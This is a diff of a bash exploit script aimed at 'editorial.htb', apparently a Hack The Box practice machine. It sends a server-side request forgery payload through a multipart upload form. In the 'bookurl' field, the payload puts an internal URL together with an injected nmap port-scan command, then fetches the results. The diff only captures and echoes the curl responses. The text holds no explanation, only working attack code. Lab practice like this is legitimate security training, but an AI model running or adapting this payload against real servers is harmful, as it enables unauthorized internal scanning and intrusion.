@@ -8,7 +8,7 @@ payload="http://127.0.0.1; nmap -p 1-6000 -sV 127.0.0.1"
 # Function to perform the SSRF attack
 perform_ssrf_attack() {
   echo "Performing SSRF attack..."
-  curl -X POST "$url" \
+  response=$(curl -s -X POST "$url" \
     -H "Host: editorial.htb" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
     -H "Accept: */*" \
@@ -18,15 +18,15 @@ perform_ssrf_attack() {
     -H "Origin: http://editorial.htb" \
     -H "Connection: close" \
     -H "Referer: http://editorial.htb/upload" \
-    --data-binary $'-----------------------------344841833123013796121821834300\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\n'"$payload"$'\r\n-----------------------------344841833123013796121821834300\r\nContent-Disposition: form-data; name="bookfile"; filename="doc1"\r\nContent-Type: application/octet-stream\r\n\r\n(binary file content)\r\n-----------------------------344841833123013796121821834300--'
-  echo "SSRF attack performed."
+    --data-binary $'-----------------------------344841833123013796121821834300\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\n'"$payload"$'\r\n-----------------------------344841833123013796121821834300\r\nContent-Disposition: form-data; name="bookfile"; filename="doc1"\r\nContent-Type: application/octet-stream\r\n\r\n(binary file content)\r\n-----------------------------344841833123013796121821834300--')
+  echo "SSRF attack performed. Response: $response"
 }
 
 # Function to monitor and fetch results
 fetch_results() {
   echo "Fetching results..."
-  curl "$result_url"
-  echo "Results fetched."
+  results=$(curl -s "$result_url")
+  echo "Results fetched: $results"
 }
 
 # Execute the functions
